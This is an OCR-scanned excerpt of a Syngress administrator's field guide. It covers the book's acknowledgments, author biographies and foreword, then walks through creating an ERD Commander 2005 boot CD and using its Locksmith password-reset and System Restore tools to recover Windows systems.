Syngress would like to acknowledge the following people for their kindness 
and support in making this book possible. 
Syngress books are now distributed in the United States and Canada by 
O'Reilly Media, Inc. The enthusiasm and work ethic at O'Reilly are incredible, 
and we would like to thank everyone there for their time and efforts to bring 
Syngress books to market" Tim O'Reilly, Laura Baldwin, Mark Brokering, Mike 
Leonard, Donna Selenko, Bonnie Sheehan, Cindy Davis, Grant Kikkert, Opol 
Matsutaro, Steve Hazelwood, Mark Wilson, Rick Brown, Tim Hinton, Kyle 
Hart, Sara Winge, Peter Pardo, Leslie Crandell, Regina Aggio Wilkinson, Pascal 
Honscher, Preston Paull, Susan Thompson, Bruce Stewart, Laura Schmier, Sue 
Willing, Mark Jacobsen, Betsy Waliszewski, Kathryn Barrett, John Chodacki, 
Rob Bullington, Kerry Beck, Karen Montgomery, and Patrick Dirden. 
The incredibly hardworking team at Elsevier Science, including Jonathan 
Bunkell, Ian Seager, Duncan Enright, David Burton, Rosanna Ramacciotti, 
Robert Fairbrother, Miguel Sanchez, Klaus Beran, Emma Wyatt, Krista 
Leppiko, Marcel Koppes, Judy Chappell, Radek Janousek, Rosie Moss, David 
Lockley, Nicola Haden, Bill Kennedy, Martina Morris, Kai Wuerfl-Davidek, 
Christiane Leipersberger, Yvonne Grueneklee, Nadia Balavoine, and Chris 
Reinders for making certain that our vision remains worldwide in scope. 
David Buckland, Marie Chieng, Lucy Chong, Leslie Lim, Audrey Gan, Pang Ai 
Hua, Joseph Chan, June Lim, and Siti Zuraidah Ahmad of Pansing Distributors 
for the enthusiasm with which they receive our books. 
David Scott, Tricia Wilden, MariNa Burgess, Annette Scott, Andrew Swaffer, 
Stephen O'Donoghue, Bec Lowe, Mark Langley, and Anyo Geddes of Woodslane 
for distributing our books throughout Australia, New Zealand, Papua New 
Guinea, Fiji, Tonga, Solomon Islands, and the Cook Islands. 

Dave Kleiman (CAS, CCE, CIFI, CISM, CISSP, ISSAP, ISSMP, 
MCSE) has worked in the information technology security sector 
since 1990. Currently, he is the owner of 
SecurityBreachResponse.com and is the Chief Information Security 
Officer for Securit-e-Doc, Inc. Before starting this position, he was 
Vice President of Technical Operations at Intelliswitch, Inc., where 
he supervised an international telecommunications and Internet ser- 
vice provider network. Dave is a recognized security expert. A 
former Florida Certified Law Enforcement Officer, he specializes in 
computer forensic investigations, incident response, intrusion anal- 
ysis, security audits, and secure network infrastructures. He has 
written several secure installation and configuration guides about 
Microsoft technologies that are used by network professionals. He 
has developed a Windows operating system lockdown tool, S-Lok 
(www.s=doc.com/products/slok.asp), which surpasses NSA, NIST, 
and Microsoft Common Criteria Guidelines. 
Dave was a contributing author to Microsoft Log Parser Toolkit 
(Syngress Publishing, ISBN: 1-932266-52-6). He is frequently a 
speaker at many national security conferences and is a regular con- 
tributor to many security-related newsletters, Web sites, and Internet 
forums. Dave is a member of several organizations, including the 
International Association of Counter Terrorism and Security 
Professionals (IACSP), International Society of Forensic Computer 
Examiners(g) (ISFCE), Information Systems Audit and Control 
Association| (ISACA), High Technology Crime Investigation 
Association (HTCIA), Network and Systems Professionals 
Association (NaSPA),Association of Certified Fraud Examiners 
(ACFE), Anti Terrorism Accreditation Board (ATAB), and ASIS 
International| 
He is also a Secure Member and Sector Chief for 
Information Technology at The FBI's InfraGard(g) and a Member 
and Director of Education at the International Information Systems 
Forensics Association (IISFA). 
vii 

Lawrence Abrams is the CTO for Thorn Communications, an 
Internet service provider based in New York City that focuses on 
managed services for colocation customers at its three data centers. 
Lawrence manages the technical and security operations as well as 
being involved in the day-to-day operations of the business. He is 
involved with the deployment and monitoring of intrusion preven- 
tion systems, intrusion detection systems, and firewall systems 
throughout Thorn's network to protect Thorn's customers. Lawrence 
is also the creator of BleepingComputer.com, a Web site designed to 
provide computer help and security information to people with all 
levels of technical skills. With more than a million different visitors 
each month, it has become a leading resource to find the latest spy- 
ware removal guides. 
Lawrence's areas of expertise include malware removal and com- 
puter forensics. He is active in the various online antimalware com- 
munities where he researches new malware programs as they are 
released and disseminates this information to the public in the form 
of removal guides. He was awarded a Microsoft Most Valuable 
Professional (MVP) in Windows security for this activity. 
Lawrence currently resides in New York City with his wife, Jill, 
and his twin boys, Alec and Isaac. 
Nancy Altholz (MSCS, MVP) is a Microsoft MVP in Windows 
Security. She is a security expert and Wiki Malware Removal Sysop 
at the CastleCops Security Forum. As Wiki Malware Removal 
Sysop, she oversees and authors many of the procedures that assist 
site visitors and staff in system disinfection and malware prevention. 
As a security expert, she helps computer users with various 
Windows computer security issues. Nancy is currently coauthoring 
Rootkitsfor Dummies (John Wiley Publishing), which is due for 
release in August 2006. She was formerly employed by Medelec's 
viii 

Vickers Medical Division as a Software Engineer in New Product 
Development. Nancy holds a master's degree in Computer Science. 
She lives with her family in Briarcliff Manor, NY. 
Kimon Andreou is the Chief Technology Officer at Secure Data 
Solutions (SDS) in West Palm Beach, FL. SDS develops software 
solutions for electronic discovery in the legal and accounting indus- 
tries. SDS is also a provider of computer forensic services. His 
expertise is in software development, software quality assurance, data 
warehousing, and data security. Kimon's experience includes posi- 
tions as Manager of Support & QA at S-doc, a software security 
company, and as Chief Solution Architect for SPSS in the Enabling 
Technology Division. He also has led projects in Asia, Europe, North 
America, and South America. Kimon holds a Bachelor of Science in 
Business Administration from the American College of Greece and a 
Master of Science in Management Information Systems from 
Florida International University. 
Brian Barber (MCSE, MCP+I, MCNE, CNE-5, CNE-4, CNA-3, 
CNA-GW) is coauthor of Syngress Publishing's Configuring 
Exchange 2000 Server (ISBN: 1-928994-25-3), Configuring and 
Troubleshooting Windows XP Professional (ISBN: 1-928994-80-6), and 
two study guides for the MSCE on Windows Server 2003 track 
(exams 70-296 [ISBN: 1-932266-57-7] and 70-297 [ISBN: 1- 
932266-54-2]). He is a Senior Technology Consultant with Sierra 
Systems Consultants Inc. in Ottawa, Canada. He specializes in IT 
service management and technical and infrastructure architecture, 
focusing on systems management, multiplatform integration, direc- 
tory services, and messaging. In the past he has held the positions of 
Senior Technical Analyst at MetLife Canada and Senior Technical 
Coordinator at the LGS Group Inc. (now a part of IBM Global 
Services). 
ix 

Tony Bradley (CISSP-ISSAP, MCSE, MCSA, A+) is a Fortune 
100 security architect and consultant with more than eight years of 
computer networking and administration experience, focusing the 
last four years on security. Tony provides design, implementation, 
and management of security solutions for many Fortune 500 enter- 
prise networks. Tony is also the writer and editor of the About.com 
site for Internet/network security. He writes frequently for many 
technical publications and Web sites. 
I want to thank my wife, Nicki, for her support and dedication as I 
worked on this project. She is my "Sunshine" and my inspiration. I also 
want to thank Gary Byrne and Dave Kleiman for inviting me to participate 
on this project and for their unending patience as we worked to put it all 
together. 
Daniel Covell (CCNA, MCP) is a Senior Systems Analyst at Sharp 
HealthCare in San Diego. Sharp HealthCare is an integrated 
regional health-care delivery system that includes four acute-care 
hospitals, three specialty hospitals, and three medical groups. Sharp 
has more than 14,000 employees and represents $1 billion in assets 
and $1.4 billion in revenue. Daniel is a key team member in sup- 
porting more than 10,000 desktops and thousands of PDAs, laptops, 
and tablets. 
Daniel has more than 13 years of experience in desktop support, 
network support, and system design. He has worked for government 
agencies, large outsourcing projects, and several consulting firms. His 
experience gives him a very broad understanding of technology and 
its management. 
Daniel also owns a small computer consultancy business and 
currently resides in E1 Cajon, CA, with his wife, Dana. 
Daniel wrote the section of Chapter 5 titled "Advanced Disk 
Fragmentation Management (Defrag Manager)." 
Laura E. Hunter (CISSP, MCSE" Security, MCDBA, Microsoft 
MVP) is an IT Project Leader and Systems Manager at the 
University of Pennsylvania, where she provides network planning, 

implementation, and troubleshooting services for various business 
units and schools within the university. Her specialties include 
Windows 2000 and 2003 Active Directory design and implementa- 
tion, troubleshooting, and security topics. Laura has more than a 
decade of experience with Windows computers; her previous expe- 
rience includes a position as the Director of Computer Services for 
the Salvation Army and as the LAN administrator for a medical 
supply firm. She is a contributor to the TechTarget family of Web 
sites and to Redmond Magazine (formerly Microsoft Certified 
Professional Magazine). 
Laura has previously contributed to the Syngress Windows 
Server 2003 MCSE/MCSA DVD Guide & Training System series 
as a DVD presenter, author, and technical reviewer, and is the author 
of the Active Directory Consultant's Field Guide (ISBN: 1-59059-492- 
4) from APress. Laura is a three-time recipient of the prestigious 
Microsoft MVP award in the area of Windows Server~ 
Networking. Laura graduated with honors from the University of 
Pennsylvania and also works as a freelance writer, trainer, speaker 
and consultant. 
Laura wrote Chapter 3 and was the technical editor for Chapters 5 
and 6. 
Mahesh Satyanarayana is a final-semester electronics and commu- 
nications engineering student at the Visveswaraiah Technological 
University in Shimoga, India. He expects to graduate this summer 
and has currently accepted an offer to work for Caritor Inc., an 
SEI-CMM Level 5 global consulting and systems integration com- 
pany headquartered in San Ramon, CA. Caritor provides IT infras- 
tructure and business solutions to clients in several sectors 
worldwide. Mahesh will be joining the Architecture and Design 
domain at Caritor's development center in Bangalore, India, where 
he will develop software systems for mobile devices. His areas of 
expertise include Windows security and related Microsoft program- 
mini technologies. He is also currently working toward adminis- 
trator-level certification on the Red Hat Linux platform. 
xi 

Craig A. Schiller (CISSP-ISSMP, ISSAP) is the President of 
Hawkeye Security Training, LLC. He is the primary author of the 
first Generally Accepted System Security Principles. He was a coau- 
thor of several editions of the Handbook of Information Security 
Management and a contributing author to Data Security Management. 
Craig has cofounded two ISSA U.S. regional chapters: the Central 
Plains Chapter and the Texas Gulf Coast Chapter. He is a member 
of the Police Reserve Specialists unit of the HiUsboro Police 
Department in Oregon. He leads the unit's Police-to-Business- 
High-Tech speakers' initiative and assists with Internet forensics. 
Darren Windham (CISSP) is the Information Security lead at 
ViewPoint Bank, where he is responsible for ensuring compliance 
with GLB, FFIEC, OTS, FDIC, and SOX regulations, as well as 
managing technology risks within the organization. 
Darren's previous experience in technology includes network 
design, system configuration, security audits, internal investigations, 
and regulatory compliance. He has also worked as a security consul- 
tant for local companies, including other financial institutions. His 
background also includes system administration for manufacturing 
firms and one of the .coms of the late 1990s. Darren was a reviewer 
for the book Hacking Exposed: Computer Forensics (McGraw-Hill 
Osborne Media, ISBN: 0-07225-675-3). 
Darren is a member of Information Systems Audit and Control 
Association| (ISACA), North Texas Electronic Crimes Task Force 
(N-TEC), and the North Texas Snort User Group. 
Companion Web Site 
Some of the code presented throughout this book is available for 
download from www.syngress.com/solutions. Look for the Syngress 
icon in the margins indicating which examples are available from 
the companion Web site. 
xii 

Foreword 
Six years and seven months ago, Winternals brought forth a set of tools that 
came to my rescue. It was November of 1999 when I purchased my first 
Winternals Administrator's Pak. It contained BlueSave Version 1.01, ERD 
Commander Professional Version 1.06, Monitoring Tools (FileMon and 
Regmon) Enterprise Editions Version 1.0, NTFSDOS ProfessionalVersion 3.03, 
NTRecoverVersion 1.0, and Remote Recover Version 1.01.We had a Windows 
NT 4 server in the dead zone. I spent a few hours reading over the ERD and 
Remote Recover user guides, created a "client floppy" (yes this was when we 
still had to use floppies), and began my quest. Thank goodness that version of 
ERD had the ability to access NT-defined fault-tolerant drives, because within 
a few hours we had recovered the system and were back up and running. Since 
my Windows NT administrator experience began in 1996, I thought back on 
hundreds of incidents that made me wish I had purchased Winternals sooner. 
We have come a long way since then; the Winternals team has improved upon 
and added many tools and features to the Administrator's Pak utilities. However, 
one thing remains the same~in the Microsoft administrator's world, Winternals 
is a lifesaver. 
Winternals not only makes excellent products you can purchase for the 
enterprise but also sponsors the freeware Sysinternals tools 
(www.sysinternals.com), by far the greatest collection of freeware tools for the 
Microsoft administrator's toolbox in the market. 
I spent quite a bit of time speaking with Winternals users with various 
experience using the utilities and tools for different functions. Many of those 
users expressed interest in helping with the book, so I gathered a group of 
security professionals from around the globe, and we formed an outline. We had 
a great time working together and throwing ideas, and some jokes, around at 
each other.We set out with a goal of writing about the Winternals and 
.
~
 
XXIII 

xxiv 
Foreword 
Sysinternals tools in real-world situations administrators can and will face on a 
daffy basis, with the hope of making your jobs easier. The result was the 
Winternals Defragmentation, Recovery, and Administration Field Guide.All of the 
authors have worked extremely hard to put together a book that we hope you 
will find useful and enjoyable. 
We begin with ERD Commander 2005 and then step through recovering 
your computer (what a change from back in 1999 to now).We then give you 
an overview of utilizing the tools for various tasks, such as locating and 
removing malware, troubleshooting, configuring security, recovering data, 
working with the source code to create useful tools, and working with NT 
4.0-only tools.We wrap things up with a chapter about having fun with the 
Sysinternals tools. Heck, we have to have some fun in our jobs, and what better 
way then giving your fellow sysadmin gray hair with some fake BSODs! 
All of us, and I imagine many of you, would like to thank Mark 
Russinovich, Bryce Cogswell, and the Winternals team for putting together 
these utilities, giving us the fine selection of freeware tools, and making the 
lives of Microsoft administrators around the globe that much easier. In addition, 
we would like to thank Syngress for giving us the opportunity to get this infor- 
mation out to the community. 
~Dave Kleiman 
Owner of SecurityBreachResponse.com 
and Chief Investigator, Secure Data Solutions, LLC 


Chapter 1 9 Recovering Your Computer with ERD Commander 
Introduction 
ERD commander is one of the finest compilations of emergency utilities for 
Microsoft systems administrators. With its graphical and command line environments 
that have the ability to access any Windows NT files system from a bootable CD in 
a Windows like environment, it is an integral part of the Windows administrator's 
toolbox. There have been many times that I have been greeted by the Blue Screen of 
Death after installing a hotfix, and it was ERD that came to the rescue. 
If there is one thing Winternals software is known for, it is its capability to bring 
dead systems back to life. Do not get me wrong. Winternals software is capable of 
doing so much more than that, but I am convinced that if you asked 100 network 
administrators of Windows servers what Winternals software is known for, they 
would say it is known for recovering a server that has fallen and cannot get up. 
Whether it is diagnosing windows crashes, finding malware, remotely recovering files 
off a dead system, fixing registry mishaps, or gaining access to a system you have 
been locked out of, END is there for you. 
Utilizing ERD Commander 2005 
ERD Commander 2005 is the crown jewels of Winternals' latest version of the 
Administrator's Pak. To help you get started, the ERD Commander 2005 Boot CD 
Wizard will guide you through the task of creating the most appropriate bootable 
CD for your environment. Once you have tailored the boot CD to your require- 
ments and tastes, you can boot the system and begin to grasp the power that is at 
your fingertips. In subsequent sections, we will delve into booting into the ERD 
Commander 2005 desktop interface and we will discuss the use of three of the most 
commonly used utilities for recovering an inaccessible or unresponsive system. 
Creating the ERD Commander 2005 Boot CD 
The ERE) Commander 2005 Boot CD is not the main tool in the network adminis- 
trator or desktop support professional's toolbox; it is the toolbox. The team at 
Winternals has created a powerful collection of tools and has made them available in a 
single location, accessible from a familiar and easy-to-use interface. In terms of the 
tasks you would perform to recover an inaccessible or unresponsive system, you should 
have everything you need on the CD. In this section, we will walk through the process 
of creating the boot CD, and customizing ERD Commander 2005 to suit your needs. 
Assuming you have the Winternals Administrator's Pak already installed, you can 
proceed to the wizard that configures and creates the ERD Commander 2005 Boot 
CD, which is located in the Winternals Administrator's Pak program group (select 

Recovering Your Computer with ERD Commander 9 Chapter 1 
3 
Programs I Administrators Pak I ERD Commander 
2005 Boot CD 
Wizard). After double-clicking the Program Group item to hunch the wizard, you 
will be presented with the "Welcome..." screen shown in Figure 1.1. 
Figure 1.1 Launching the ERD Commander 2005 Boot CD Wizard 
Click the About button to display ERD Commander 2005 version informa- 
tion. Click the Next button to proceed to the screen for accepting the Winternals 
license (see Figure 1.2). Note that the Next button is disabled until you except the 
license agreement; you must accept the license agreement to continue progressing 
through the wizard. Click the "Yes, I accept..." radio button and click Next to 
continue. Clicking "No, I do not accept..." will terminate the wizard. 
Figure 1.2 Accepting the License Agreement 
The next screen displays the licensing information that you entered when you 
originally installed the Winternals Administrator's Pak. The expiration date is worth 
noting (see Figure 1.3).You will most commonly use this software under difficult 
www.syngress.com 

Chapter 1 9 Recovering Your Computer with ERD Commander 
circumstances, and it would be awful for the software license to expire and the soft- 
ware to be unsupported or disabled just when you need to use it. Click the Next 
button to continue. 
Figure 1.3 Verifying the Licensing Information 

Recovering Your Computer with ERD Commander 9 Chapter 1 
5 
At this stage of the wizard, you will need to extract and prepare files so that you 
can configure and tailor them to your requirements in subsequent stages. Clicking 
the Next button will launch the file extraction process, shown in Figure 1.4. 
Figure 1.4 Extracting the Files Required for the Boot CD 
At this stage in the wizard we are starting to configure the boot CD, beginning 
with boot options (see Figure 1.5). The first boot option will cause the CD to boot 
straight into ERD Commander 2005.The second option is to boot into the remote 
recover client. The third option will present a selection screen (seen in Figure 1.20) 
and will prompt the user to boot into either the ERD Commander 2005 desktop 
interface or the Remote Recover client. Option number three (dual-mode opera- 
tion) provides the most flexibility and will be the most desirable option for most 
network administrators. Click the radio button for the desired option and click the 
Next button to continue. 
Figure 1.5 Setting Up the Boot Options for the CD 
www.syngress.com 

Chapter 1 9 Recovering Your Computer with ERD Commander 
At this stage in the wizard, the process splits into two paths that rejoin at a later 
step. If you selected the first option ("Always boot to ERD Commander 2005"), you 
will proceed into configuring the ERD Commander 2005 user interface. Choosing 
the second option ("Always boot as a Remote Recover client"), shown selected in 
Figure 1.6, will skip ERD Commander 2005 configuration and will take you 
through the process of configuring Remote Recover. If you selected dual-mode 
operation, ERD Commander 2005 will be configured first, before Remote Recover. 
Figure 1.6 Configuring a Remote Recover Client Boot CD 
Remote Recover uses User Datagram Protocol (UDP) over Ethernet to access 
the server that needs to be revived (as opposed to NTRecover, which uses RS-232 
[serial] connectivity over a null-modem serial cable; NTRecover will be discussed in 
detail in Chapter 11). As seen in Figure 1.7, the Remote Recover Options screen 
involves setting the UDP port number and restricting file system access on the client 
from the boot CD to read-only. Read-only access is sufficient for recovering data 
from the client system. If you need to add, rename, modify, or delete files on the 
client system, leave the checkbox empty, which is the default setting. Click the Next 
button to continue. 

Recovering Your Computer with ERD Commander 9 Chapter 1 
7 
Figure 1.7 Setting Remote Recover UDP Port and Disk Access Options 
You configure the options for controlling access to the client system on the 
Remote Recover Security screen (see Figure 1.8). Since the purpose of this part of 
the wizard is to configure the client system boot disk~the boot disk that is used to 
boot the system to be recovered~the options establish the conditions under which 
functioning systems can connect. Functioning systems will need to run the host soft- 
ware, at a minimum. The first option will permit connections from any system run- 
ning the host software. The second will permit a connection from a system that is 
using the particular boot disk you are creating. The third option will permit connec- 
tions from any system running the host software as long as the correct password is 
provided. The password field will be enabled when you click on the radio button for 
the third option. Once you have chosen the desired option, click the Next button to 
continue. This concludes the configuration of Remote Recover. The next screen 
after this stage, Additional Mass Storage Drivers, is shown in Figure 1.12. 
Figure 1.8 Configuring Remote Recover Security 

8 
Chapter 1 9 Recovering Your Computer with ERD Commander 
If you had opted to boot ERA) Commander 2005 (refer back to Figure 1.5), you 
would have proceeded directly to the first stage in configuring the ERD Commander 
2005 user interface, displayed in Figure 1.9. This stage involves selecting what tools 
you want to be available on the boot disk. All included components will be available 
from the Start menu in the ERE) Commander 2005 desktop and through the 
Solution Wizard. By default, all tools are included. Once you have finished adding 
and removing the listed components crick the Next button to continue. 
Figure 1.9 Equipping the Boot CD with Recovery and Management Tools 
You have two options for configuring Crash Analyzer support. Choosing the 
first option will install the debugging tools on the boot CD.You can use the default 
debugging tool offered in the available field (see Figure 1.10) or you can use the 
"..." button at the right of the field to navigate to the appropriate directory where 
your desired debugging tool is located. If Microsoft's "Debugging Tools for 
Windows" is not installed or the Wizard cannot locate the package, the Next button 
will be disabled, forcing you to select the second option. For option number two, 
you will use the debugging tool on the partition that hosts the Windows installation 
you will be attempting to recover. If the files required by the Crash Analyzer are 
missing or corrupted in the Windows installation directory, you are out of luck. The 
safest option is the first one. Select the desired option's radio button and click Next 
to continue. 

Recovering Your Computer with ERD Commander 9 Chapter 1 
9 
screen and download the package, click the Cancel button to terminate 
the wizard, install it, and rerun the wizard. You could trust the 
Debugging Tools on the client system, but if the file system is not intact 
or if the package was not installed on it, you will wish you had included 
it on the boot disk. 
Figure 1.10 Configuring Crash Analyzer Support 
On the Password Protection screen, you have the option of preventing unautho- 
rized use of the CD by enforcing the use of a password before being able to access 
the ERD Commander 2005 desktop interface. Do not take this screen lightly. ERD 
Commander 2005 presents a level of access to a system that may be dangerous in the 
hands of an untrained or reckless individual, such as resetting passwords, which is 
demonstrated later in this chapter when we discuss being the locksmith. If unautho- 
rized use of the CD is possible, choose the second option and enter an identical 
password in both fields (see Figure 1.11). Click the Next button to continue. 

10 
Chapter 1 9 Recovering Your Computer with ERD Commander 
Figure 1.11 Securing the ERD Commander 2005 Boot CD 
This is the stage where the two configuration processes (as dictated by the 
options you chose in Figure 1.5) rejoin. The next two screens permit the addition of 
drivers for mass storage devices and network controllers, or network interface cards 
(NICs). By default, the boot disk is equipped with a vast array of the most common 
device drivers. If you use specialized or less common controllers, or if you suspect 
that your device may be newer than the vintage of supplied mass storage drivers, you 
should add them here. Click the Add Device button to specify the required drivers 
(see Figure 1.12).You will be asked for a location where the driver files are stored. 
You can specify as many drivers as you think you will need. Click the Next button 
to proceed to adding network controller drivers. 
Figure 1.12 Adding Mass Storage Drivers 

Recovering Your Computer with ERD Commander 9 Chapter 1 
11 
There is a good chance that you do not need to add anything on this screen; 
however, as stated earlier in this chapter, if you use NlCs that are newer than your 
version of the Administrator's Pak or you are using an esoteric network device, it is a 
good idea to add the driver as a precaution. The boot CD is equipped by default to 
support many network controller drivers and will use all of its drivers to attempt to 
bring up a NIC, not simply the ones you add on the screen. Once you have added 
the required network controller drivers, click the Next button to continue (see 
Figure 1.13). 
Figure 1.13 Adding NIC Drivers 
On this screen, you have the opportunity to add any additional files you think 
you might need to use to recover a system (see Figure 1.14). One suggestion would 
be to add a screen capture utility to generate screenshots while recovering the 
system in case you need to document what you have done.You will need to aggre- 
gate them in a single directory first, and then, using the Explore button, specify the 
directory. Once you have provided the location, click the Next button to continue. 

12 
Chapter 1 9 Recovering Your Computer with ERD Commander 
Figure 1.14 Specifying Additional Utilities to Add on the Boot CD 
You are almost done. On the Write CD Image File screen (as seen in Figure 
1.15), you can accept the default location or select the location where you want the 
CD image to be written. The Browse button will bring up an Explorer window for 
you to navigate to the desired directory.You are free to change the filename to 
something more significant; however, it is imperative that you preserve the .iso file- 
name extension. Click Next to begin the CD image creation process, as seen in 
Figure 1.16. 
Figure 1.1 5 Specifying the Location of the CD Image File 
A typical image that is configured using all of the default settings is approxi- 
mately 153 MB in size, and occupies only about 25 percent of the capacity of a typ- 
ical consumer-grade blank CD-R.You can use any CD-R, CD-RW, DVD-R, or 
DVD-RW media. Identify the media that your systems can boot from before 
selecting the media. It would be awful if you went to recover a system with ERD 
Commander 2005 burned to DVD-RW media, only to find out that the system is 

Recovering Your Computer with ERD Commander 9 Chapter 1 
13 
not equipped with a drive that accepts DVD media. CD-lk is probably the safest 
option because it is the most universally recognized. 
Figure 1.16 Creating the Boot CD Image 
If the "Burn to the following CD recordable drive now..." selection is not avail- 
able (see Figure 1.17), your recording device is not natively supported by the wizard. 
If it is available, the image will be saved to your hard disk, and you can transfer the 
image using third-party software. Selecting "View supported recordable CD devices" 
will display the vast list of CD-R, CD-RW, DVD-R, and DVD-RW drives that are 
natively supported by ERD Commander 2005. 
Figure 1.17 Transferring the CD Image to Blank CD Media 
If your drive is supported, click Next to create the CD.You will be prompted to 
insert blank media into your recordable CD device, and you will see the progress of 
the image transfer process (see Figure 1.18). If your drive is not supported you can use 
your favorite CD burning software to burn the .iso image to a blank CD or DVD. 

14 
Chapter 1 ~ Recovering Your Computer with ERD Commander 
Figure 1.18 Completing the ERD Commander 2005 Boot CD Wizard 
This is the final stage in the E1KD Commander 2005 Boot CD Wizard. The 
Explore button in Figure 1.18 will open Windows Explorer to the directory speci- 
fied just above the button. If the CD creation could not be completed you may be 
able to launch the appropriate application from a context menu in the Explorer 
window. Failing that, you can do so from the Start menu. At this point, your individ- 
ually tailored boot disk is complete.You are now ready to boot a system and start 
using the E1KD Commander 2005 utilities. 
Using ERD Commander 2005 Recovery Utilities 
If you left all of the components selected on the Tool Selection step of the wizard, 
they will be available from one of the three tool-related Program Groups on the 
Start menu in the ERD Commander 2005 desktop environment. Table 1.1 lists the 
Program Groups and where the tools are located. 
Table 1.1 ERD Commander 2005 Program Groups and Tool Names 
Program Group 
Administrative Tools 
Networking Tools 
Tool Name 
Autoruns (described in Chapter 2) 
Disk Management 
Event Log 
RegEdit 
Service and Driver Manager 
System Info 
File Sharing 
Map Network Drive 
TCP/IP Configuration 
Continued 

Recovering Your Computer with ERD Commander 9 Chapter 1 
15 
Table 1.1 continued ERD Commander 2005 Program Groups and Tool 
Names 
Program Group 
System Tools 
Tool Name 
Crash Analyzer (described in Chapter 7) 
Disk Commander 
Disk Wipe 
FileRestore (described in Chapter 6) 
Hotfix Uninstall (described later in this 
chapter) 
Locksmith (described later in this chapter) 
System Compare 
System File Repair 
System Restore (described later in this 
chapter) 
In addition to these stand-alone utilities, there is the Solution Wizard (shown in 
Figure 1.19). It is located in the top level of the ERD Commander 2005 Start menu 
(select Start ] Solution Wizard). It is especially useful if you are unsure what 
utility to use, as it presents categories of typical system management and recovery 
tasks on a series of screens and asks questions that assist in narrowing down the 
choice of utilities to what should be the most appropriate for what you are trying to 
accomplish. 
Figure 1.19 Accessing Winternals Recovery and Management Tools from the 
Solution Wizard 

16 
Chapter 1 9 Recovering Your Computer with ERD Commander 
The ERD Commander 2005 desktop interface works in exactly the same way as 
a conventional Windows interface. If configured with the correct drivers, ERD 
Commander 2005 is network enabled and capable of managing local file systems, 
browsing the network in multiple domains, mapping to shared network drives, and 
connecting to the Internet. Common utilities, such as a text editor (Notepad), a file 
manager (Explorer), a Web browser (Mozilla Firefox), a terminal window for com- 
mand-line access (Console), and a search facility are included and accessible from the 
Start menu.You get all of this functionality in addition to the powerful Winternals 
management and recovery tools. In the sections that follow, we will discuss how to 
use some of the most popular utilities. 
Booting a Dead System 
This section will examine the use of the ERD Commander 2005 Boot CD to access 
a system in need of some assistance. If you have the Winternals Administrator's Pak 
and you selected dual-mode operation in the Remote Recover step of the ERD 
Commander 2005 Boot CD Wizard (see Figure 1.5), you will be presented with 
options on how to use the CD for a given session, as shown in Figure 1.20. The first 
option (Run ERD Commander) is the default and when you select it, you will pro- 
ceed to configuring the ERD Commander session. If you select "Run Remote 
Recover client," you will proceed directly to a Remote Recover session. Clicking 
OK commits the selection and takes you into your selected session. If you do not 
wish to proceed to either of the available sessions, you can click on the appropriately 
named Reboot button, which causes the system to reboot, and you can start 
Windows normally. 
Figure 1.20 Selecting a Boot Option 

Recovering Your Computer with ERD Commander 9 Chapter 1 
17 
If you need to interact with the file system on the system to be revived, you will 
need to select the appropriate partition with a Windows installation on it (see Figure 
1.21). By default, the first partition discovered to have Windows installed on it will 
be selected and highlighted. If you do not need to connect to an operating system 
partition, you can select the line marked "(None)" in the System Root column. 
Select the appropriate keyboard layout and time zone for the server from the avail- 
able entries in the drop-down boxes and click OK to continue. 
Figure 1.21 Connecting to a Windows Partition 
The boot sequence is now complete. The ERD Commander 2005 desktop envi- 
ronment (as seen in Figure 1.19) will be displayed (without any windows open), and 
you will be able to start restoring normal operation on the system. 
Being the Locksmith 
You may find yourself in the unenviable position of inheriting a server whose pre- 
vious administrator is no longer with the organization and has taken the password 
with him, or the even more unenviable position of having forgotten the password to 
your own server. Dozens of reputable and not-so-reputable password recovery 
www.syngress.com 

18 
Chapter 1 9 Recovering Your Computer with ERD Commander 
applications are available for resetting the password for the Administrator account. 
The Locksmith Wizard does more than many of these applications because it will 
unlock or reset the passwords for any local account on the system, and you do not 
need to know the original password.You can find it in the System Tools Program 
Group in the Start menu. Alternatively, with the correct answers to the appropriate 
questions, the Solution Wizard will also launch the Locksmith Wizard. 
You should boot into E1KD Commander 2005 using the process described in 
the preceding section. For Locksmith to work, you must connect to a Windows par- 
tition because data is read from and written to the system Registry. After launching 
the wizard (select Start I System Tools I Locksmith), you will see the first 
screen, shown in Figure 1.22, which merely contains information about the 
Locksmith Wizard. Click the Next button on the "Welcome..." screen to proceed. 
On the Select New Password screen, there is a drop-down list of all local 
account names. Select the account name for which you want to reset the password 
and enter the new password in the first field. Then confirm it by entering it again in 
the second field, as seen in Figure 1.23. Click on the Next button to continue. 
www.syngress.com 

Recovering Your Computer with ERD Commander 9 Chapter 1 
19 
Figure 1.22 Launching the Locksmith Wizard 
Figure 1.23 Resetting the Password for the Administrator Account 

20 
Chapter 1 9 Recovering Your Computer with ERD Commander 
On the final screen (shown in Figure 1.24), click the Finish button to exit the 
wizard. Note that the Back button is disabled. If you need to reverse the change to 
the password you just reset, or you need to modify the password for other local 
accounts, you can rerun Locksmith. 
Figure 1.24 Completing the Locksmith Wizard 
You should reboot the system normally (select Start I Log Off I Restart 
I 
OK, and remove the ERD Commander 2005 Boot CD) immediately after com- 
pleting the wizard, or at your earliest convenience.Your password changes are not 
committed until you boot into Windows normally. To put it simply, the password 
that you saved last is the one that counts. 
Accessing Restore Points 
When we think about what E1KD Commander 2005 is capable of, images of recov- 
ering servers that have gone down unexpectedly come to mind; however, it is per- 
fectly capable of working with another part of the Windows product family that 
shares in the common operating system code base: the various editions of Windows 
XE In fact, E1KD Commander 2005 has a utility, called System Restore, which 
works only on Windows XE Only Windows XP has the functionality to create 
system restore points, so if the installation of an application or a new version of a 
driver causes your system to do things you never wanted it to do, you can roll the 
installation back to a happier time and place, when everything worked. If the system 
becomes unresponsive, attempting to roll back within a Windows XP environment is 
very difficult, if it is even possible. System Restore permits the rollback to a stable 

Recovering Your Computer with ERD Commander 9 Chapter 1 
21 
restore point without you having to run a now-unstable build of Windows XE We 
will discuss the steps for using System Restore in the paragraphs that follow. 
You begin by booting into the ERD Commander 2005 environment using the 
process described earlier in the chapter. For System Restore to work, you need to 
connect to a Windows partition because data is read from and written to the system 
Registry, and to the file system. After launching the wizard (select Start I System 
Tools [ System Restore), you will see the first screen, which describes the System 
Restore Wizard (see Figure 1.25). Click the Next button on the "Welcome..." 
screen to proceed. 
Figure 1.25 Launching the System Restore Wizard 
If System Restore locates the restore points on the mounted Windows partition, 
the "Welcome..." screen will appear as it does in Figure 1.25. If System Restore 
does not locate any restore points, the Next button will be disabled and exiting the 
wizard will be your only available option (by using the Cancel button.) Assuming 
